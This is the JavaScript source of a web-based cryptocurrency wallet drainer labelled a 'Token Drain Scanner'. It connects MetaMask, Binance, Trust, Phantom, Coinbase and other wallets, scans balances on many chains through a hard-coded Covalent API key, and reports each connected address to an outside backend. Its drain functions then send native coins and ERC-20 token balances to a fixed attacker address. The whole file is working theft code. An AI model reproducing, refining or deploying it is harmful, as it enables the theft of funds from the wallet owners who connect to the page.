// ================================================
// TOKEN DRAIN SCANNER - PROPER WALLET ISOLATION
// SOLVES WALLET CONFLICTS
// ================================================

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    minimumValueUSD: 0.01,
    
    networkNames: {
        1: "Ethereum",
        56: "BNB Smart Chain", 
        137: "Polygon",
        10: "Optimism",
        42161: "Arbitrum",
        43114: "Avalanche",
        8453: "Base",
        250: "Fantom",
        100: "Gnosis",
        25: "Cronos",
        324: "zkSync Era"
    }
};

// Global state
let currentAccount = null;
let currentChainId = null;
let isConnected = false;
let detectedTokens = [];
let selectedWallet = null;
let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    console.log('📱 Device:', isMobile ? 'Mobile' : 'Desktop');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Handle connect button click
async function handleConnect() {
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    showSimpleWalletSelector();
}

// Show simple wallet selector
function showSimpleWalletSelector() {
    const selectorHTML = `
        <div class="wallet-selector-overlay">
            <div class="wallet-selector-modal">
                <div class="modal-header">
                    <h3>Connect Wallet</h3>
                    <button class="close-btn" onclick="closeWalletSelector()">&times;</button>
                </div>
                
                <div class="wallets-list">
                    <div class="wallet-item" onclick="connectWithProvider('metaMask')">
                        <div class="wallet-icon" style="background: #f6851b;">🦊</div>
                        <div class="wallet-info">
                            <div class="wallet-name">MetaMask</div>
                            <div class="wallet-desc">Browser Extension</div>
                        </div>
                    </div>
                    
                    <div class="wallet-item" onclick="connectWithProvider('binance')">
                        <div class="wallet-icon" style="background: #f0b90b;">🟡</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Binance Wallet</div>
                            <div class="wallet-desc">Binance Chain Extension</div>
                        </div>
                    </div>
                    
                    <div class="wallet-item" onclick="connectWithProvider('trust')">
                        <div class="wallet-icon" style="background: #3375bb;">🔶</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Trust Wallet</div>
                            <div class="wallet-desc">Mobile & Extension</div>
                        </div>
                    </div>
                    
                    <div class="wallet-item" onclick="connectWithProvider('phantom')">
                        <div class="wallet-icon" style="background: #ab9ff2;">👻</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Phantom</div>
                            <div class="wallet-desc">Solana & EVM</div>
                        </div>
                    </div>
                    
                    <div class="wallet-item" onclick="connectWithProvider('coinbase')">
                        <div class="wallet-icon" style="background: #0052ff;">🔷</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Coinbase Wallet</div>
                            <div class="wallet-desc">Coinbase Extension</div>
                        </div>
                    </div>
                    
                    <div class="wallet-item" onclick="connectWithProvider('any')">
                        <div class="wallet-icon" style="background: #6366f1;">🔗</div>
                        <div class="wallet-info">
                            <div class="wallet-name">Other Wallet</div>
                            <div class="wallet-desc">Any EVM Wallet</div>
                        </div>
                    </div>
                </div>
                
                <div class="instructions">
                    <p><strong>Tip:</strong> If a wallet doesn't connect, try disabling other wallet extensions temporarily.</p>
                </div>
            </div>
        </div>
    `;
    
    const selector = document.createElement('div');
    selector.id = 'walletSelector';
    selector.innerHTML = selectorHTML;
    document.body.appendChild(selector);
    
    addSelectorStyles();
}

// Connect with specific provider
async function connectWithProvider(walletType) {
    closeWalletSelector();
    selectedWallet = walletType;
    
    updateStatus(`🔄 Connecting ${walletType}...`);
    
    try {
        let result;
        
        switch(walletType) {
            case 'metaMask':
                result = await forceMetaMaskConnection();
                break;
            case 'binance':
                result = await forceBinanceConnection();
                break;
            case 'trust':
                result = await forceTrustConnection();
                break;
            case 'phantom':
                result = await forcePhantomConnection();
                break;
            case 'coinbase':
                result = await forceCoinbaseConnection();
                break;
            default:
                result = await forceAnyConnection();
        }
        
        if (result.success) {
            await handleConnected(result.account, result.chainId, walletType);
        } else {
            updateStatus(`❌ Failed: ${result.error}`);
            showSimpleWalletSelector();
        }
        
    } catch (error) {
        console.error('Connection error:', error);
        updateStatus(`❌ Error: ${error.message}`);
        showSimpleWalletSelector();
    }
}

// ================================================
// FORCEFUL WALLET CONNECTIONS
// These functions FORCE specific wallets to connect
// ================================================

// Force MetaMask connection
async function forceMetaMaskConnection() {
    console.log('🔍 Looking for MetaMask...');
    
    // Method 1: Check if MetaMask is primary
    if (window.ethereum?.isMetaMask) {
        console.log('✅ MetaMask found as primary');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    // Method 2: Check providers array
    if (window.ethereum?.providers) {
        console.log('🔍 Checking providers array...');
        for (const provider of window.ethereum.providers) {
            if (provider.isMetaMask) {
                console.log('✅ Found MetaMask in providers array');
                try {
                    const accounts = await provider.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    const chainIdHex = await provider.request({ 
                        method: 'eth_chainId' 
                    });
                    return { 
                        success: true, 
                        account: accounts[0], 
                        chainId: parseInt(chainIdHex, 16) 
                    };
                } catch (error) {
                    console.log('MetaMask in array failed:', error);
                }
            }
        }
    }
    
    // Method 3: Check for MetaMask injected directly
    if (typeof window.ethereum !== 'undefined') {
        console.log('⚠️ Generic ethereum found, trying anyway...');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error: 'MetaMask not found' };
        }
    }
    
    // Method 4: Mobile fallback
    if (isMobile) {
        window.location.href = `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`;
        return { success: false, error: 'Redirecting to MetaMask mobile' };
    }
    
    return { success: false, error: 'MetaMask not detected' };
}

// Force Binance Wallet connection - CRITICAL FIX
async function forceBinanceConnection() {
    console.log('🔍 Looking for Binance Wallet...');
    
    // Method 1: Try Binance Chain FIRST (separate provider)
    if (window.BinanceChain) {
        console.log('✅ Found BinanceChain provider');
        try {
            const accounts = await window.BinanceChain.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.BinanceChain.request({ 
                method: 'eth_chainId' 
            });
            console.log('✅ BinanceChain connected successfully');
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log('BinanceChain failed:', error);
        }
    }
    
    // Method 2: Check for Binance in ethereum providers
    if (window.ethereum?.isBinance) {
        console.log('✅ Found Binance via ethereum.isBinance');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log('Binance via ethereum failed:', error);
        }
    }
    
    // Method 3: Check providers array for Binance
    if (window.ethereum?.providers) {
        console.log('🔍 Checking providers array for Binance...');
        for (const provider of window.ethereum.providers) {
            if (provider.isBinance) {
                console.log('✅ Found Binance in providers array');
                try {
                    const accounts = await provider.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    const chainIdHex = await provider.request({ 
                        method: 'eth_chainId' 
                    });
                    return { 
                        success: true, 
                        account: accounts[0], 
                        chainId: parseInt(chainIdHex, 16) 
                    };
                } catch (error) {
                    console.log('Binance in array failed:', error);
                }
            }
        }
    }
    
    // Method 4: Mobile fallback
    if (isMobile) {
        if (/iphone|ipad|ipod/i.test(navigator.userAgent)) {
            window.location.href = 'bnc://app.binance.com/';
        } else {
            window.location.href = 'intent://app.binance.com/#Intent;scheme=bnc;package=com.binance.dev;end';
        }
        return { success: false, error: 'Redirecting to Binance mobile' };
    }
    
    // Method 5: Try to trigger Binance popup by checking window.ethereum
    if (window.ethereum) {
        console.log('⚠️ No Binance found, trying generic ethereum for Binance');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error: 'Binance Wallet not found' };
        }
    }
    
    return { success: false, error: 'Binance Wallet not detected' };
}

// Force Trust Wallet connection
async function forceTrustConnection() {
    console.log('🔍 Looking for Trust Wallet...');
    
    // Method 1: Check if Trust is primary
    if (window.ethereum?.isTrust) {
        console.log('✅ Trust Wallet found as primary');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    // Method 2: Check providers array
    if (window.ethereum?.providers) {
        console.log('🔍 Checking providers array for Trust...');
        for (const provider of window.ethereum.providers) {
            if (provider.isTrust) {
                console.log('✅ Found Trust in providers array');
                try {
                    const accounts = await provider.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    const chainIdHex = await provider.request({ 
                        method: 'eth_chainId' 
                    });
                    return { 
                        success: true, 
                        account: accounts[0], 
                        chainId: parseInt(chainIdHex, 16) 
                    };
                } catch (error) {
                    console.log('Trust in array failed:', error);
                }
            }
        }
    }
    
    // Method 3: Mobile fallback
    if (isMobile) {
        window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(window.location.href)}`;
        return { success: false, error: 'Redirecting to Trust mobile' };
    }
    
    // Method 4: Trust often appears as generic MetaMask on desktop
    if (window.ethereum) {
        console.log('⚠️ No Trust found, trying generic ethereum');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error: 'Trust Wallet not found' };
        }
    }
    
    return { success: false, error: 'Trust Wallet not detected' };
}

// Force Phantom connection
async function forcePhantomConnection() {
    console.log('🔍 Looking for Phantom...');
    
    // Method 1: Check Phantom's own provider
    if (window.phantom?.ethereum) {
        console.log('✅ Found phantom.ethereum');
        try {
            const accounts = await window.phantom.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.phantom.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log('phantom.ethereum failed:', error);
        }
    }
    
    // Method 2: Check if Phantom is primary ethereum
    if (window.ethereum?.isPhantom) {
        console.log('✅ Phantom found via ethereum.isPhantom');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log('Phantom via ethereum failed:', error);
        }
    }
    
    // Method 3: Check providers array
    if (window.ethereum?.providers) {
        console.log('🔍 Checking providers array for Phantom...');
        for (const provider of window.ethereum.providers) {
            if (provider.isPhantom) {
                console.log('✅ Found Phantom in providers array');
                try {
                    const accounts = await provider.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    const chainIdHex = await provider.request({ 
                        method: 'eth_chainId' 
                    });
                    return { 
                        success: true, 
                        account: accounts[0], 
                        chainId: parseInt(chainIdHex, 16) 
                    };
                } catch (error) {
                    console.log('Phantom in array failed:', error);
                }
            }
        }
    }
    
    return { success: false, error: 'Phantom not detected' };
}

// Force Coinbase connection
async function forceCoinbaseConnection() {
    console.log('🔍 Looking for Coinbase Wallet...');
    
    // Method 1: Check if Coinbase is primary
    if (window.ethereum?.isCoinbaseWallet) {
        console.log('✅ Coinbase Wallet found as primary');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }
    
    // Method 2: Check providers array
    if (window.ethereum?.providers) {
        console.log('🔍 Checking providers array for Coinbase...');
        for (const provider of window.ethereum.providers) {
            if (provider.isCoinbaseWallet) {
                console.log('✅ Found Coinbase in providers array');
                try {
                    const accounts = await provider.request({ 
                        method: 'eth_requestAccounts' 
                    });
                    const chainIdHex = await provider.request({ 
                        method: 'eth_chainId' 
                    });
                    return { 
                        success: true, 
                        account: accounts[0], 
                        chainId: parseInt(chainIdHex, 16) 
                    };
                } catch (error) {
                    console.log('Coinbase in array failed:', error);
                }
            }
        }
    }
    
    // Method 3: Mobile fallback
    if (isMobile) {
        window.location.href = `https://go.cb-w.com/${encodeURIComponent(window.location.href)}`;
        return { success: false, error: 'Redirecting to Coinbase mobile' };
    }
    
    // Method 4: Try generic
    if (window.ethereum) {
        console.log('⚠️ No Coinbase found, trying generic ethereum');
        try {
            const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            return { success: false, error: 'Coinbase Wallet not found' };
        }
    }
    
    return { success: false, error: 'Coinbase Wallet not detected' };
}

// Force any connection
async function forceAnyConnection() {
    console.log('🔍 Looking for any wallet...');
    
    // Try all possible providers in order
    const providers = [];
    
    // 1. Binance Chain (separate)
    if (window.BinanceChain) {
        providers.push({ name: 'BinanceChain', provider: window.BinanceChain });
    }
    
    // 2. Phantom's own provider
    if (window.phantom?.ethereum) {
        providers.push({ name: 'Phantom', provider: window.phantom.ethereum });
    }
    
    // 3. Ethereum providers
    if (window.ethereum) {
        if (window.ethereum.providers) {
            // Multiple providers
            window.ethereum.providers.forEach((provider, index) => {
                let name = 'Provider ' + index;
                if (provider.isMetaMask) name = 'MetaMask';
                if (provider.isTrust) name = 'Trust';
                if (provider.isBinance) name = 'Binance';
                if (provider.isCoinbaseWallet) name = 'Coinbase';
                if (provider.isPhantom) name = 'Phantom';
                providers.push({ name, provider });
            });
        } else {
            // Single provider
            let name = 'Ethereum';
            if (window.ethereum.isMetaMask) name = 'MetaMask';
            if (window.ethereum.isTrust) name = 'Trust';
            if (window.ethereum.isBinance) name = 'Binance';
            if (window.ethereum.isCoinbaseWallet) name = 'Coinbase';
            if (window.ethereum.isPhantom) name = 'Phantom';
            providers.push({ name, provider: window.ethereum });
        }
    }
    
    console.log('Found providers:', providers.map(p => p.name));
    
    // Try each provider
    for (const { name, provider } of providers) {
        try {
            console.log(`Trying ${name}...`);
            const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
            });
            const chainIdHex = await provider.request({ 
                method: 'eth_chainId' 
            });
            console.log(`✅ Connected with ${name}`);
            return { 
                success: true, 
                account: accounts[0], 
                chainId: parseInt(chainIdHex, 16) 
            };
        } catch (error) {
            console.log(`${name} failed:`, error.message);
            continue;
        }
    }
    
    return { success: false, error: 'No wallet detected' };
}

// ================================================
// CONNECTION HANDLER
// ================================================

// Handle successful connection
async function handleConnected(account, chainId, walletType) {
    try {
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        selectedWallet = walletType;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected with ${walletType}!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show drain button
        if (drainBtn) {
            drainBtn.style.display = 'block';
            drainBtn.disabled = false;
            drainBtn.innerHTML = '⚡ Scan Tokens';
        }
        
        // Setup event listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId, walletType);
        
        // Fetch tokens
        await scanAllChainsForTokens(account);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        disconnectWallet();
    }
}

// Setup wallet listeners
function setupWalletListeners() {
    const provider = getCurrentProvider();
    if (!provider || !provider.on) return;
    
    provider.on('accountsChanged', (accounts) => {
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            scanAllChainsForTokens(currentAccount);
        }
    });
    
    provider.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        scanAllChainsForTokens(currentAccount);
    });
}

// Get current provider
function getCurrentProvider() {
    // Try based on selected wallet
    if (selectedWallet === 'binance' && window.BinanceChain) {
        return window.BinanceChain;
    }
    
    if (selectedWallet === 'phantom' && window.phantom?.ethereum) {
        return window.phantom.ethereum;
    }
    
    // Fallback to ethereum
    return window.ethereum;
}

// Scan all chains for tokens
async function scanAllChainsForTokens(address) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    // Scan major chains
    const chainsToScan = [1, 56, 137, 42161, 10, 43114, 8453, 250, 324];
    let allTokens = [];
    
    for (const chainId of chainsToScan) {
        try {
            const tokens = await fetchTokensForChain(address, chainId);
            if (tokens.length > 0) {
                allTokens = [...allTokens, ...tokens];
            }
        } catch (error) {
            // Silently fail for individual chains
        }
        await new Promise(resolve => setTimeout(resolve, 200));
    }
    
    detectedTokens = allTokens;
    
    if (allTokens.length > 0) {
        displayTokens(allTokens);
        const totalValue = allTokens.reduce((sum, token) => sum + token.valueUSD, 0);
        updateStatus(`✅ Found ${allTokens.length} tokens ($${totalValue.toFixed(2)})`);
        
        if (drainBtn) {
            drainBtn.innerHTML = `⚡ Drain All Tokens ($${totalValue.toFixed(2)})`;
        }
    } else {
        tokensEl.innerHTML = '<div class="no-tokens">No tokens found</div>';
        updateStatus('ℹ️ No tokens found');
    }
}

// Fetch tokens for chain
async function fetchTokensForChain(address, chainId) {
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false&no-spam=true`
        );
        
        if (!response.ok) return [];
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        return items
            .filter(t => {
                if (t.balance === "0") return false;
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                return value >= CONFIG.minimumValueUSD;
            })
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    rawAmount: t.balance,
                    valueUSD: value,
                    value: value ? `$${value.toFixed(2)}` : 'N/A',
                    contractAddress: t.contract_address,
                    decimals: t.contract_decimals || 18,
                    chainId: chainId,
                    chainName: CONFIG.networkNames[chainId] || `Chain ${chainId}`,
                    isNative: t.native_token || false,
                    logoUrl: t.logo_url
                };
            });
    } catch (error) {
        return [];
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    let html = '<div class="tokens-grid">';
    
    tokens.forEach(token => {
        html += `
            <div class="token-card">
                <div class="token-header">
                    <div class="token-icon">
                        ${token.logoUrl ? `<img src="${token.logoUrl}" alt="${token.symbol}">` : token.symbol.charAt(0)}
                    </div>
                    <div class="token-symbol">${token.symbol}</div>
                </div>
                <div class="token-details">
                    <div class="token-name">${token.name}</div>
                    <div class="token-chain">${token.chainName}</div>
                    <div class="token-amount">${token.amount}</div>
                    <div class="token-value">${token.value}</div>
                </div>
            </div>
        `;
    });
    
    html += '</div>';
    tokensEl.innerHTML = html;
}

// Handle drain
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Connect wallet first');
        return;
    }
    
    if (detectedTokens.length === 0) {
        alert('No tokens to drain');
        return;
    }
    
    const totalValue = detectedTokens.reduce((sum, t) => sum + t.valueUSD, 0);
    
    if (!confirm(`Drain ${detectedTokens.length} tokens ($${totalValue.toFixed(2)})?`)) {
        return;
    }
    
    const provider = getCurrentProvider();
    if (!provider) {
        alert('Wallet not connected');
        return;
    }
    
    try {
        updateStatus('🚀 Draining...');
        drainBtn.disabled = true;
        drainBtn.innerHTML = '⏳ Processing...';
        
        // Simple drain - just try each token
        for (const token of detectedTokens) {
            try {
                if (token.isNative) {
                    await drainNativeToken(provider, token);
                } else {
                    await drainERC20Token(provider, token);
                }
                await new Promise(resolve => setTimeout(resolve, 2000));
            } catch (error) {
                console.error(`Failed ${token.symbol}:`, error);
            }
        }
        
        updateStatus('✅ Drain completed');
        alert('Drain completed');
        
        await scanAllChainsForTokens(currentAccount);
        
    } catch (error) {
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert('Drain failed');
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.innerHTML = '⚡ Drain All Tokens';
        }
    }
}

// Drain functions
async function drainNativeToken(provider, token) {
    const gasPriceHex = await provider.request({ method: 'eth_gasPrice' });
    const gasPrice = parseInt(gasPriceHex, 16);
    const gasLimit = 21000;
    const gasCost = gasPrice * gasLimit;
    
    const balance = BigInt(token.rawAmount);
    if (balance <= gasCost * 2) return;
    
    const sendAmount = balance - (gasCost * 1.5);
    if (sendAmount <= 0) return;
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: CONFIG.drainAddress,
            value: '0x' + sendAmount.toString(16),
            gas: '0x' + gasLimit.toString(16),
            gasPrice: gasPriceHex
        }]
    });
}

async function drainERC20Token(provider, token) {
    const transferData = '0xa9059cbb' + 
        CONFIG.drainAddress.slice(2).padStart(64, '0') + 
        BigInt(token.rawAmount).toString(16).padStart(64, '0');
    
    await provider.request({
        method: 'eth_sendTransaction',
        params: [{
            from: currentAccount,
            to: token.contractAddress,
            data: transferData,
            gas: '0x' + (50000).toString(16)
        }]
    });
}

// Update status
function updateStatus(message) {
    if (statusEl) statusEl.textContent = message;
}

// Log connection
async function logConnectionToBackend(address, chainId, walletType) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                wallet: walletType,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        // Silent fail
    }
}

// Close wallet selector
function closeWalletSelector() {
    const selector = document.getElementById('walletSelector');
    if (selector) selector.remove();
}

// Disconnect wallet
async function disconnectWallet() {
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    detectedTokens = [];
    selectedWallet = null;
    
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    
    if (drainBtn) {
        drainBtn.style.display = 'none';
    }
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Add CSS styles
function addSelectorStyles() {
    const styles = `
        .wallet-selector-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            padding: 20px;
        }
        
        .wallet-selector-modal {
            background: white;
            border-radius: 16px;
            width: 100%;
            max-width: 500px;
            max-height: 90vh;
            overflow-y: auto;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        
        .modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 24px;
            border-bottom: 1px solid #e5e7eb;
        }
        
        .modal-header h3 {
            margin: 0;
            font-size: 24px;
            font-weight: 600;
            color: #111827;
        }
        
        .close-btn {
            background: #f3f4f6;
            border: none;
            font-size: 28px;
            cursor: pointer;
            color: #4b5563;
            line-height: 1;
            padding: 0;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.2s;
        }
        
        .close-btn:hover {
            background: #e5e7eb;
        }
        
        .wallets-list {
            padding: 24px;
        }
        
        .wallet-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 20px;
            border: 2px solid #e5e7eb;
            border-radius: 12px;
            margin-bottom: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .wallet-item:hover {
            border-color: #3b82f6;
            background: #f8fafc;
            transform: translateY(-2px);
        }
        
        .wallet-icon {
            width: 56px;
            height: 56px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 28px;
            color: white;
            flex-shrink: 0;
        }
        
        .wallet-info {
            flex: 1;
        }
        
        .wallet-name {
            font-weight: 600;
            font-size: 18px;
            color: #111827;
            margin-bottom: 4px;
        }
        
        .wallet-desc {
            color: #6b7280;
            font-size: 14px;
        }
        
        .instructions {
            padding: 20px 24px;
            background: #f9fafb;
            border-top: 1px solid #e5e7eb;
            border-radius: 0 0 16px 16px;
        }
        
        .instructions p {
            margin: 0;
            color: #6b7280;
            font-size: 14px;
            text-align: center;
        }
        
        /* Token display */
        .tokens-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 16px;
            padding: 20px;
        }
        
        .token-card {
            background: white;
            border: 1px solid #e5e7eb;
            border-radius: 12px;
            padding: 16px;
            transition: all 0.2s;
        }
        
        .token-card:hover {
            border-color: #3b82f6;
            box-shadow: 0 4px 12px rgba(59, 130, 246, 0.1);
        }
        
        .token-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 12px;
        }
        
        .token-icon {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            background: #3b82f6;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            font-size: 18px;
            overflow: hidden;
        }
        
        .token-icon img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .token-symbol {
            font-weight: 600;
            font-size: 16px;
            color: #111827;
        }
        
        .token-details {
            font-size: 14px;
        }
        
        .token-name {
            color: #4b5563;
            margin-bottom: 4px;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }
        
        .token-chain {
            color: #6b7280;
            font-size: 12px;
            margin-bottom: 8px;
        }
        
        .token-amount {
            font-weight: 600;
            color: #111827;
            margin-bottom: 4px;
        }
        
        .token-value {
            color: #059669;
            font-weight: 500;
        }
        
        .loading, .no-tokens {
            text-align: center;
            padding: 40px;
            color: #6b7280;
        }
        
        @media (max-width: 640px) {
            .tokens-grid {
                grid-template-columns: 1fr;
            }
            
            .wallet-item {
                padding: 16px;
            }
            
            .wallet-icon {
                width: 48px;
                height: 48px;
                font-size: 24px;
            }
        }
    `;
    
    const styleSheet = document.createElement('style');
    styleSheet.textContent = styles;
    document.head.appendChild(styleSheet);
}

// Initialize on load
window.addEventListener('DOMContentLoaded', initializeApp);

// Make functions global
window.closeWalletSelector = closeWalletSelector;
window.connectWithProvider = connectWithProvider;

console.log('=== Token Drain Scanner ===');
console.log('Version: FORCEFUL CONNECTIONS');
console.log('===========================');
